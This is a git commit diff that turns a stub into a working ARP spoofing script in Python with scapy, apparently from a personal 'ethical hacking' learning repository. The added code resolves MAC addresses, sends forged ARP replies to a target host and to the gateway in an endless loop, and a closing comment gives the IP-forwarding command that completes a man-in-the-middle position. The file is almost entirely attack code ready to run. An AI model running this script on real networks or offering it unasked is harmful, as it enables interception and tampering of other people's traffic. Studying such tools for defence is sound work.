6c530277529341905a25a0ac5c6866df1acce1de
wambugu-dennis <wambugudennis398@gmail.com>
2022-08-31 00:45:44 +0300

    commit

--- Python and Ethical Hacking scripts/arp_spoofer.py
+++ Python and Ethical Hacking scripts/arp_spoofer.py
@@ -1,12 +1,33 @@
 #!/usr/bin/env python
+import time
+import scapy.all as scapy
 
 # created by Wambugu
 # 30-08-2022
 
-import scapy.all as scapy
 
-packet = scapy.ARP(op=2, pdst="192.168.100.152", hwdst="92:9a:4a:07:d4:17", psrc="192.168.100.1")
-print(packet.show())
-print(packet.summary())
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)  # get IPs of clients from arp broadcast request
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # send arp request to the broadcast address
+    arp_request_broadcast = broadcast / arp_request
+    # capture answered result packets in a list, set a time to end search and less verbose result
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-#  this is a test 2
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+sent_packets_count = 0
+while True:
+    spoof("192.168.100.10", "192.168.100.1")
+    spoof("192.168.100.1", "192.168.100.10")
+    print("[+] Packets sent: " + str(sent_packets_count))
+    time.sleep(2)
+
+    # echo 1 > /proc/sys/net/ipv4/ip_forward
+    # above command allows packets to flow through attacking machine without being dropped
